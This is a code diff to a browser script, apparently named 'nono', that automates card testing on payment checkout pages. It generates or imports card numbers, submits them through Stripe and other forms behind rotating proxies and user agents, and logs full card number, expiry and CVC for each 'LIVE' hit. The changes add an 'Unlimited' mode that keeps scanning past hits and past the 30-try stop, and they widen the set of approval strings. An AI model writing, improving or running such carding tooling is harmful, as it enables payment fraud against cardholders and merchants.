@@ -1018,6 +1018,15 @@
     return false;
   }
 
+  async function settleResultText(timeout) {
+    const start = Date.now();
+    while (Date.now() - start < (timeout || 2600)) {
+      const t = (document.body ? document.body.innerText : "") || "";
+      if (!/processing|please wait|connecting|just a moment/.test(t)) return;
+      await sleep(400);
+    }
+  }
+
   function logButtons() {
     const out = [];
     const buttons = Array.from(document.querySelectorAll(
@@ -1137,7 +1146,7 @@
       return { ok: true, label: "3DS CHALLENGE" };
     }
     const good = [
-      "thank you", "payment successful", "payment complete", "approved",
+      "thank you", "payment successful", "payment complete", "approved", "authorised", "authorized",
       "processing", "redirecting", "almost done", "your payment was made",
       "payment succeeded", "success", "payment received",
       "thanks for your purchase", "your purchase has been completed", "payment complete"
@@ -1288,6 +1297,9 @@
             </label>
             <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
               <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
+            </label>
+            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer" title="Keep scanning cards without stopping on each result">
+              <input type="checkbox" id="nono-continuous" style="width:auto;accent-color:#ffcc00"> Unlimited
             </label>
           </div>
 
@@ -1446,6 +1458,7 @@
         cardLength: parseInt(el("#nono-len").value, 10) || 0,
         autoSubmit: el("#nono-autosubmit").checked,
         autoOnLoad: el("#nono-autoonload").checked,
+        continuous: el("#nono-continuous").checked,
         autoInbuilt: el("#nono-autoinbuilt") ? el("#nono-autoinbuilt").checked : false,
         autoStripe: el("#nono-autostripe") ? el("#nono-autostripe").checked : false,
         enabled: true
@@ -1707,6 +1720,8 @@
         return;
       }
 
+      const contP = !!(cfg && cfg.continuous !== false);
+
       stopRequested = false;
       tries = 0;
       liveHits = 0;
@@ -1829,8 +1844,8 @@
           window.__nonoResult && window.__nonoResult("&#11088;",
             "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
             " " + card.cvc + " -> " + res.label, "#00d1b2");
-          logMsg("LIVE HIT! " + res.label + ". Stopping.");
-          stopRequested = true;
+          logMsg(contP ? ("LIVE hit #" + liveHits + " — keep scanning.") : ("LIVE HIT! " + res.label + ". Stopping."));
+          if (!contP) stopRequested = true;
 
           const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
           const uaLabel = ua && ua.label ? ua.label : "";
@@ -1854,7 +1869,7 @@
           window.__nonoResult && window.__nonoResult("&#10060;",
             "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
             " " + card.cvc + " -> " + res.label, "#ff5d5d");
-          if (tries >= 30) {
+          if (!contP && tries >= 30) {
             logMsg("30 tries. Stopping.");
             stopRequested = true;
           }
@@ -2135,6 +2150,7 @@
   async function runHits() {
     const cfg = await getConfig();
     if (!cfg) return;
+    const continuous = cfg.continuous !== false;
     running = true;
     injectHook();
     window.__nonoLog && window.__nonoLog("Running...");
@@ -2212,6 +2228,7 @@
       }
 
       const resp = lastRespSince(hitStart);
+      if (!resp) await settleResultText(2600);
       let respInfo = null;
       let respProvider = "";
       if (resp) {
@@ -2279,8 +2296,8 @@
         window.__nonoResult && window.__nonoResult("&#11088;",
           "LIVE #" + liveHits + "  " + card.number + " " + card.month + "/" + card.year.slice(-2) +
           " " + card.cvc + " -> " + res.label, "#00d1b2");
-        window.__nonoLog && window.__nonoLog("LIVE HIT! " + res.label + ". Stopping.");
-        stopRequested = true;
+        window.__nonoLog && window.__nonoLog(continuous ? ("LIVE hit #" + liveHits + " — keep scanning.") : ("LIVE HIT! " + res.label + ". Stopping."));
+        if (!continuous) stopRequested = true;
 
         const prLabel = pr && pr.proxy && pr.proxy.label ? pr.proxy.label : "";
         const uaLabel = ua && ua.label ? ua.label : "";
@@ -2303,7 +2320,7 @@
         window.__nonoResult && window.__nonoResult("&#10060;",
           "try#" + tries + " " + card.number + " " + card.month + "/" + card.year.slice(-2) +
           " " + card.cvc + " -> " + res.label + respTail, "#ff5d5d");
-        if (tries >= 30) {
+        if (!continuous && tries >= 30) {
           window.__nonoLog && window.__nonoLog("30 dead tries. Stopping.");
           stopRequested = true;
         }
@@ -2337,8 +2354,8 @@
     if (comboCountEl) comboCountEl.textContent = importedCombos.length + " combos";
     const cfg = await getConfig();
     if (cfg) {
-      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-email", "nono-country", "nono-postal", "nono-stripe-url", "nono-len", "nono-autosubmit", "nono-autoonload"];
-      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.country || "", cfg.postal || "", cfg.stripeUrl || "", String(cfg.cardLength || 0), cfg.autoSubmit == null ? true : !!cfg.autoSubmit, !!cfg.autoOnLoad];
+      const ids = ["nono-bin", "nono-combo", "nono-holder", "nono-email", "nono-country", "nono-postal", "nono-stripe-url", "nono-len", "nono-autosubmit", "nono-autoonload", "nono-continuous"];
+      const vals = [cfg.bin || "", cfg.combo || "", cfg.holder || "", cfg.email || "", cfg.country || "", cfg.postal || "", cfg.stripeUrl || "", String(cfg.cardLength || 0), cfg.autoSubmit == null ? true : !!cfg.autoSubmit, !!cfg.autoOnLoad, cfg.continuous === false ? false : true];
       ids.forEach((id, i) => {
         const e = document.getElementById(id);
         if (e) {
